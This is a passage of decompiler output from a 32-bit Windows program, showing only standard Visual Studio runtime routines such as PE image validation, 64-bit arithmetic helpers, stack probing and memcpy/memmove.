BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  uint uVar1;
  BOOL BVar2;
  PIMAGE_SECTION_HEADER p_Var3;
  int **in_FS_OFFSET;
  int *local_14;
  code *pcStack16;
  uint local_c;
  undefined4 local_8;
  
  pcStack16 = __except_handler4;
  local_14 = *in_FS_OFFSET;
  local_c = DAT_0041b004 ^ 0x41a140;
  *in_FS_OFFSET = (int *)&local_14;
  local_8 = 0;
  BVar2 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar2 != 0) {
    p_Var3 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var3 != (PIMAGE_SECTION_HEADER)0x0) {
      uVar1 = p_Var3->Characteristics;
      *in_FS_OFFSET = local_14;
      return ~(uVar1 >> 0x1f) & 1;
    }
  }
  *in_FS_OFFSET = local_14;
  return 0;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  uint uVar1;
  
  if (*(short *)pImageBase != 0x5a4d) {
    return 0;
  }
  uVar1 = 0;
  if (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550) {
    uVar1 = (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return uVar1;
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2015 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4_GS
// 
// Library: Visual Studio 2015 Release

void __cdecl __SEH_prolog4_GS(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_0041b004 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_004129b9(void)

{
  undefined in_DL;
  uint unaff_EBP;
  undefined1 unaff_retaddr;
  
  FUN_0040296a(*(uint *)(unaff_EBP - 0x1c) ^ unaff_EBP,in_DL,unaff_retaddr);
  return;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2015 Release

ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return (ulonglong)param_1 * (ulonglong)param_3 & 0xffffffff |
         (ulonglong)
         ((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
         param_2 * param_3 + param_1 * param_4) << 0x20;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2015 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2015 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2015 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __alloca_probe
// 
// Libraries: Visual Studio 2015, Visual Studio 2017, Visual Studio 2019

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __allshl
// 
// Library: Visual Studio 2015 Release

longlong __fastcall __allshl(byte param_1,int param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 << (param_1 & 0x1f) | in_EAX >> 0x20 - (param_1 & 0x1f),
                    in_EAX << (param_1 & 0x1f));
  }
  return (ulonglong)(in_EAX << (param_1 & 0x1f)) << 0x20;
}



undefined8 __fastcall FUN_00412b90(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  bool bVar3;
  float fVar4;
  float10 in_ST0;
  uint local_20;
  float fStack28;
  
  if (DAT_0041bb84 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack28 = (float)(uVar1 >> 0x20);
    fVar4 = (float)in_ST0;
    if ((local_20 != 0) || (fVar4 = fStack28, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar4 < 0) {
        uVar2 = (uint)(0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
        bVar3 = CARRY4(local_20,uVar2);
        local_20 = local_20 + uVar2;
        fStack28 = (float)((int)fStack28 + (uint)bVar3);
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        bVar3 = local_20 < uVar2;
        local_20 = local_20 - uVar2;
        fStack28 = (float)((int)fStack28 - (uint)bVar3);
      }
    }
    return CONCAT44(fStack28,local_20);
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined8 uVar1;
  undefined auVar2 [32];
  undefined auVar3 [32];
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined4 uVar16;
  undefined4 uVar17;
  undefined4 uVar18;
  undefined4 uVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  undefined4 uVar23;
  undefined4 uVar24;
  undefined4 uVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  undefined4 uVar28;
  undefined4 uVar29;
  undefined4 uVar30;
  undefined4 uVar31;
  int iVar32;
  undefined8 *puVar33;
  void *pvVar34;
  uint uVar35;
  size_t sVar36;
  uint uVar37;
  int iVar38;
  undefined8 *puVar39;
  undefined4 *puVar40;
  undefined *puVar41;
  undefined4 *puVar42;
  undefined4 *puVar43;
  undefined4 *puVar44;
  undefined4 uVar45;
  undefined4 uVar46;
  undefined4 uVar47;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar42 = (undefined4 *)(_Size + (int)_Src);
    puVar43 = (undefined4 *)(_Size + (int)_Dst);
    if (0x1f < _Size) {
      if ((DAT_0041b010 >> 1 & 1) == 0) {
        if (((uint)puVar43 & 3) != 0) {
          uVar35 = (uint)puVar43 & 3;
          _Size = _Size - uVar35;
          do {
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            puVar42 = (undefined4 *)((int)puVar42 + -1);
            puVar43 = (undefined4 *)((int)puVar43 - 1);
            uVar35 = uVar35 - 1;
          } while (uVar35 != 0);
        }
        if (0x1f < _Size) {
          uVar35 = _Size >> 2;
          while( true ) {
            if (uVar35 == 0) break;
            uVar35 = uVar35 - 1;
            puVar43[-1] = puVar42[-1];
            puVar42 = puVar42 + -1;
            puVar43 = puVar43 + -1;
          }
          switch(_Size & 3) {
          case 0:
            return _Dst;
          case 1:
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            return _Dst;
          case 2:
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            *(undefined *)((int)puVar43 - 2) = *(undefined *)((int)puVar42 + -2);
            return _Dst;
          case 3:
            *(undefined *)((int)puVar43 - 1) = *(undefined *)((int)puVar42 + -1);
            *(undefined *)((int)puVar43 - 2) = *(undefined *)((int)puVar42 + -2);
            *(undefined *)((int)puVar43 - 3) = *(undefined *)((int)puVar42 + -3);
            return _Dst;
          }
        }
      }
      else {
        while (puVar40 = puVar42, puVar44 = puVar43, ((uint)puVar43 & 0xf) != 0) {
          _Size = _Size - 1;
          puVar42 = (undefined4 *)((int)puVar42 + -1);
          puVar43 = (undefined4 *)((int)puVar43 + -1);
          *(undefined *)puVar43 = *(undefined *)puVar42;
        }
        do {
          puVar42 = puVar40;
          puVar43 = puVar44;
          if (_Size < 0x80) break;
          puVar42 = puVar40 + -0x20;
          puVar43 = puVar44 + -0x20;
          uVar45 = puVar40[-0x1f];
          uVar46 = puVar40[-0x1e];
          uVar47 = puVar40[-0x1d];
          uVar4 = puVar40[-0x1c];
          uVar5 = puVar40[-0x1b];
          uVar6 = puVar40[-0x1a];
          uVar7 = puVar40[-0x19];
          uVar8 = puVar40[-0x18];
          uVar9 = puVar40[-0x17];
          uVar10 = puVar40[-0x16];
          uVar11 = puVar40[-0x15];
          uVar12 = puVar40[-0x14];
          uVar13 = puVar40[-0x13];
          uVar14 = puVar40[-0x12];
          uVar15 = puVar40[-0x11];
          uVar16 = puVar40[-0x10];
          uVar17 = puVar40[-0xf];
          uVar18 = puVar40[-0xe];
          uVar19 = puVar40[-0xd];
          uVar20 = puVar40[-0xc];
          uVar21 = puVar40[-0xb];
          uVar22 = puVar40[-10];
          uVar23 = puVar40[-9];
          uVar24 = puVar40[-8];
          uVar25 = puVar40[-7];
          uVar26 = puVar40[-6];
          uVar27 = puVar40[-5];
          uVar28 = puVar40[-4];
          uVar29 = puVar40[-3];
          uVar30 = puVar40[-2];
          uVar31 = puVar40[-1];
          *puVar43 = *puVar42;
          puVar44[-0x1f] = uVar45;
          puVar44[-0x1e] = uVar46;
          puVar44[-0x1d] = uVar47;
          puVar44[-0x1c] = uVar4;
          puVar44[-0x1b] = uVar5;
          puVar44[-0x1a] = uVar6;
          puVar44[-0x19] = uVar7;
          puVar44[-0x18] = uVar8;
          puVar44[-0x17] = uVar9;
          puVar44[-0x16] = uVar10;
          puVar44[-0x15] = uVar11;
          puVar44[-0x14] = uVar12;
          puVar44[-0x13] = uVar13;
          puVar44[-0x12] = uVar14;
          puVar44[-0x11] = uVar15;
          puVar44[-0x10] = uVar16;
          puVar44[-0xf] = uVar17;
          puVar44[-0xe] = uVar18;
          puVar44[-0xd] = uVar19;
          puVar44[-0xc] = uVar20;
          puVar44[-0xb] = uVar21;
          puVar44[-10] = uVar22;
          puVar44[-9] = uVar23;
          puVar44[-8] = uVar24;
          puVar44[-7] = uVar25;
          puVar44[-6] = uVar26;
          puVar44[-5] = uVar27;
          puVar44[-4] = uVar28;
          puVar44[-3] = uVar29;
          puVar44[-2] = uVar30;
          puVar44[-1] = uVar31;
          _Size = _Size - 0x80;
          puVar40 = puVar42;
          puVar44 = puVar43;
        } while ((_Size & 0xffffff80) != 0);
        puVar40 = puVar42;
        puVar44 = puVar43;
        if (0x1f < _Size) {
          do {
            puVar42 = puVar40 + -8;
            puVar43 = puVar44 + -8;
            uVar45 = puVar40[-7];
            uVar46 = puVar40[-6];
            uVar47 = puVar40[-5];
            uVar4 = puVar40[-4];
            uVar5 = puVar40[-3];
            uVar6 = puVar40[-2];
            uVar7 = puVar40[-1];
            *puVar43 = *puVar42;
            puVar44[-7] = uVar45;
            puVar44[-6] = uVar46;
            puVar44[-5] = uVar47;
            puVar44[-4] = uVar4;
            puVar44[-3] = uVar5;
            puVar44[-2] = uVar6;
            puVar44[-1] = uVar7;
            _Size = _Size - 0x20;
            puVar40 = puVar42;
            puVar44 = puVar43;
          } while ((_Size & 0xffffffe0) != 0);
        }
      }
    }
    for (; (_Size & 0xfffffffc) != 0; _Size = _Size - 4) {
      puVar43 = puVar43 + -1;
      puVar42 = puVar42 + -1;
      *puVar43 = *puVar42;
    }
    for (; _Size != 0; _Size = _Size - 1) {
      puVar43 = (undefined4 *)((int)puVar43 - 1);
      puVar42 = (undefined4 *)((int)puVar42 + -1);
      *(undefined *)puVar43 = *(undefined *)puVar42;
    }
    return _Dst;
  }
  sVar36 = _Size;
  puVar42 = (undefined4 *)_Dst;
  if (_Size < 0x20) goto LAB_0041314b;
  if (_Size < 0x80) {
    if ((DAT_0041b010 >> 1 & 1) != 0) {
LAB_0041311d:
      if (sVar36 == 0) {
        return _Dst;
      }
      for (uVar35 = sVar36 >> 5; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
        uVar45 = *(undefined4 *)((int)_Src + 4);
        uVar46 = *(undefined4 *)((int)_Src + 8);
        uVar47 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        *puVar42 = *_Src;
        puVar42[1] = uVar45;
        puVar42[2] = uVar46;
        puVar42[3] = uVar47;
        puVar42[4] = uVar4;
        puVar42[5] = uVar5;
        puVar42[6] = uVar6;
        puVar42[7] = uVar7;
        _Src = (void *)((int)_Src + 0x20);
        puVar42 = puVar42 + 8;
      }
      goto LAB_0041314b;
    }
LAB_00412e77:
    uVar35 = (uint)_Dst & 3;
    while (uVar35 != 0) {
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      _Size = _Size - 1;
      _Src = (void *)((int)_Src + 1);
      puVar42 = (undefined4 *)((int)puVar42 + 1);
      uVar35 = (uint)puVar42 & 3;
    }
  }
  else {
    puVar41 = (undefined *)_Dst;
    if ((DAT_0041bb88 >> 1 & 1) != 0) {
                    // WARNING: Load size is inaccurate
      for (; _Size != 0; _Size = _Size - 1) {
        *puVar41 = *_Src;
        _Src = (undefined *)((int)_Src + 1);
        puVar41 = puVar41 + 1;
      }
      return _Dst;
    }
    if (((((uint)_Dst ^ (uint)_Src) & 0xf) == 0) && ((DAT_0041b010 >> 1 & 1) != 0)) {
      if (((uint)_Src & 0xf) != 0) {
        uVar37 = 0x10 - ((uint)_Src & 0xf);
        _Size = _Size - uVar37;
        for (uVar35 = uVar37 & 3; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
          *(undefined *)puVar42 = *_Src;
          _Src = (void *)((int)_Src + 1);
          puVar42 = (undefined4 *)((int)puVar42 + 1);
        }
        for (uVar37 = uVar37 >> 2; uVar37 != 0; uVar37 = uVar37 - 1) {
                    // WARNING: Load size is inaccurate
          *puVar42 = *_Src;
          _Src = (void *)((int)_Src + 4);
          puVar42 = puVar42 + 1;
        }
      }
      sVar36 = _Size & 0x7f;
      for (uVar35 = _Size >> 7; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
        uVar45 = *(undefined4 *)((int)_Src + 4);
        uVar46 = *(undefined4 *)((int)_Src + 8);
        uVar47 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        uVar8 = *(undefined4 *)((int)_Src + 0x20);
        uVar9 = *(undefined4 *)((int)_Src + 0x24);
        uVar10 = *(undefined4 *)((int)_Src + 0x28);
        uVar11 = *(undefined4 *)((int)_Src + 0x2c);
        uVar12 = *(undefined4 *)((int)_Src + 0x30);
        uVar13 = *(undefined4 *)((int)_Src + 0x34);
        uVar14 = *(undefined4 *)((int)_Src + 0x38);
        uVar15 = *(undefined4 *)((int)_Src + 0x3c);
        *puVar42 = *_Src;
        puVar42[1] = uVar45;
        puVar42[2] = uVar46;
        puVar42[3] = uVar47;
        puVar42[4] = uVar4;
        puVar42[5] = uVar5;
        puVar42[6] = uVar6;
        puVar42[7] = uVar7;
        puVar42[8] = uVar8;
        puVar42[9] = uVar9;
        puVar42[10] = uVar10;
        puVar42[0xb] = uVar11;
        puVar42[0xc] = uVar12;
        puVar42[0xd] = uVar13;
        puVar42[0xe] = uVar14;
        puVar42[0xf] = uVar15;
        uVar45 = *(undefined4 *)((int)_Src + 0x44);
        uVar46 = *(undefined4 *)((int)_Src + 0x48);
        uVar47 = *(undefined4 *)((int)_Src + 0x4c);
        uVar4 = *(undefined4 *)((int)_Src + 0x50);
        uVar5 = *(undefined4 *)((int)_Src + 0x54);
        uVar6 = *(undefined4 *)((int)_Src + 0x58);
        uVar7 = *(undefined4 *)((int)_Src + 0x5c);
        uVar8 = *(undefined4 *)((int)_Src + 0x60);
        uVar9 = *(undefined4 *)((int)_Src + 100);
        uVar10 = *(undefined4 *)((int)_Src + 0x68);
        uVar11 = *(undefined4 *)((int)_Src + 0x6c);
        uVar12 = *(undefined4 *)((int)_Src + 0x70);
        uVar13 = *(undefined4 *)((int)_Src + 0x74);
        uVar14 = *(undefined4 *)((int)_Src + 0x78);
        uVar15 = *(undefined4 *)((int)_Src + 0x7c);
        puVar42[0x10] = *(undefined4 *)((int)_Src + 0x40);
        puVar42[0x11] = uVar45;
        puVar42[0x12] = uVar46;
        puVar42[0x13] = uVar47;
        puVar42[0x14] = uVar4;
        puVar42[0x15] = uVar5;
        puVar42[0x16] = uVar6;
        puVar42[0x17] = uVar7;
        puVar42[0x18] = uVar8;
        puVar42[0x19] = uVar9;
        puVar42[0x1a] = uVar10;
        puVar42[0x1b] = uVar11;
        puVar42[0x1c] = uVar12;
        puVar42[0x1d] = uVar13;
        puVar42[0x1e] = uVar14;
        puVar42[0x1f] = uVar15;
        _Src = (void *)((int)_Src + 0x80);
        puVar42 = puVar42 + 0x20;
      }
      goto LAB_0041311d;
    }
    if (((DAT_0041bb88 & 1) == 0) || (((uint)_Dst & 3) != 0)) goto LAB_00412e77;
    if (((uint)_Src & 3) == 0) {
      if (((uint)_Dst >> 2 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar45 = *_Src;
        _Size = _Size - 4;
        _Src = (void *)((int)_Src + 4);
        *(undefined4 *)_Dst = uVar45;
        _Dst = (void *)((int)_Dst + 4);
      }
      if (((uint)_Dst >> 3 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar1 = *_Src;
        _Size = _Size - 8;
        _Src = (void *)((int)_Src + 8);
        *(undefined8 *)_Dst = uVar1;
        _Dst = (void *)((int)_Dst + 8);
      }
      if (((uint)_Src & 7) == 0) {
                    // WARNING: Load size is inaccurate
        puVar33 = (undefined8 *)((int)_Src + -8);
        uVar45 = *_Src;
        uVar46 = *(undefined4 *)((int)_Src + 4);
        do {
          puVar39 = puVar33;
          uVar5 = *(undefined4 *)(puVar39 + 4);
          uVar6 = *(undefined4 *)((int)puVar39 + 0x24);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(puVar39 + 2);
          uVar47 = *(undefined4 *)(puVar39 + 7);
          uVar4 = *(undefined4 *)((int)puVar39 + 0x3c);
          auVar3 = *(undefined (*) [32])(puVar39 + 4);
          *(undefined4 *)((int)_Dst + 8) = uVar45;
          *(undefined4 *)((int)_Dst + 0xc) = uVar46;
          *(undefined4 *)((int)_Dst + 0x10) = uVar5;
          *(undefined4 *)((int)_Dst + 0x14) = uVar6;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x40,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x40,0);
          _Dst = (void *)((int)_Dst + 0x30);
          puVar33 = puVar39 + 6;
          uVar45 = uVar47;
          uVar46 = uVar4;
        } while (0x2f < (int)_Size);
        puVar39 = puVar39 + 7;
      }
      else if (((uint)_Src >> 3 & 1) == 0) {
                    // WARNING: Load size is inaccurate
        iVar32 = (int)_Src + -4;
        uVar45 = *_Src;
        uVar46 = *(undefined4 *)((int)_Src + 4);
        uVar47 = *(undefined4 *)((int)_Src + 8);
        do {
          iVar38 = iVar32;
          uVar7 = *(undefined4 *)(iVar38 + 0x20);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar38 + 0x10);
          uVar4 = *(undefined4 *)(iVar38 + 0x34);
          uVar5 = *(undefined4 *)(iVar38 + 0x38);
          uVar6 = *(undefined4 *)(iVar38 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar38 + 0x20);
          *(undefined4 *)((int)_Dst + 4) = uVar45;
          *(undefined4 *)((int)_Dst + 8) = uVar46;
          *(undefined4 *)((int)_Dst + 0xc) = uVar47;
          *(undefined4 *)((int)_Dst + 0x10) = uVar7;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x20,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x20,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar32 = iVar38 + 0x30;
          uVar45 = uVar4;
          uVar46 = uVar5;
          uVar47 = uVar6;
        } while (0x2f < (int)_Size);
        puVar39 = (undefined8 *)(iVar38 + 0x34);
      }
      else {
                    // WARNING: Load size is inaccurate
        iVar32 = (int)_Src + -0xc;
        uVar45 = *_Src;
        do {
          iVar38 = iVar32;
          uVar47 = *(undefined4 *)(iVar38 + 0x20);
          uVar4 = *(undefined4 *)(iVar38 + 0x24);
          uVar5 = *(undefined4 *)(iVar38 + 0x28);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar38 + 0x10);
          uVar46 = *(undefined4 *)(iVar38 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar38 + 0x20);
          *(undefined4 *)((int)_Dst + 0xc) = uVar45;
          *(undefined4 *)((int)_Dst + 0x10) = uVar47;
          *(undefined4 *)((int)_Dst + 0x14) = uVar4;
          *(undefined4 *)((int)_Dst + 0x18) = uVar5;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x60,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x60,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar32 = iVar38 + 0x30;
          uVar45 = uVar46;
        } while (0x2f < (int)_Size);
        puVar39 = (undefined8 *)(iVar38 + 0x3c);
      }
      for (; 0xf < (int)_Size; _Size = _Size - 0x10) {
        uVar45 = *(undefined4 *)puVar39;
        uVar46 = *(undefined4 *)((int)puVar39 + 4);
        uVar47 = *(undefined4 *)(puVar39 + 1);
        uVar4 = *(undefined4 *)((int)puVar39 + 0xc);
        puVar39 = puVar39 + 2;
        *(undefined4 *)_Dst = uVar45;
        *(undefined4 *)((int)_Dst + 4) = uVar46;
        *(undefined4 *)((int)_Dst + 8) = uVar47;
        *(undefined4 *)((int)_Dst + 0xc) = uVar4;
        _Dst = (void *)((int)_Dst + 0x10);
      }
      if ((_Size >> 2 & 1) != 0) {
        uVar45 = *(undefined4 *)puVar39;
        _Size = _Size - 4;
        puVar39 = (undefined8 *)((int)puVar39 + 4);
        *(undefined4 *)_Dst = uVar45;
        _Dst = (void *)((int)_Dst + 4);
      }
      if ((_Size >> 3 & 1) != 0) {
        _Size = _Size - 8;
        *(undefined8 *)_Dst = *puVar39;
      }
                    // WARNING: Could not recover jumptable at 0x00412e75. Too many branches
                    // WARNING: Treating indirect jump as call
      pvVar34 = (void *)(*(code *)(&switchD_00412ea5::switchdataD_00412eb4)[_Size])();
      return pvVar34;
    }
  }
  sVar36 = _Size;
  if (0x1f < _Size) {
                    // WARNING: Load size is inaccurate
    for (uVar35 = _Size >> 2; uVar35 != 0; uVar35 = uVar35 - 1) {
      *puVar42 = *_Src;
      _Src = (undefined4 *)((int)_Src + 4);
      puVar42 = puVar42 + 1;
    }
    switch(_Size & 3) {
    case 0:
      return _Dst;
    case 1:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      return _Dst;
    case 2:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      *(undefined *)((int)puVar42 + 1) = *(undefined *)((int)_Src + 1);
      return _Dst;
    case 3:
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      *(undefined *)((int)puVar42 + 1) = *(undefined *)((int)_Src + 1);
      *(undefined *)((int)puVar42 + 2) = *(undefined *)((int)_Src + 2);
      return _Dst;
    }
  }
LAB_0041314b:
  if ((sVar36 & 0x1f) != 0) {
    for (uVar35 = (sVar36 & 0x1f) >> 2; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
      *puVar42 = *_Src;
      puVar42 = puVar42 + 1;
      _Src = (void *)((int)_Src + 4);
    }
    for (uVar35 = sVar36 & 3; uVar35 != 0; uVar35 = uVar35 - 1) {
                    // WARNING: Load size is inaccurate
      *(undefined *)puVar42 = *_Src;
      _Src = (void *)((int)_Src + 1);
      puVar42 = (undefined4 *)((int)puVar42 + 1);
    }
  }
  return _Dst;
}



// Library Function - Multiple Matches With Different Base Names
//  _memcpy
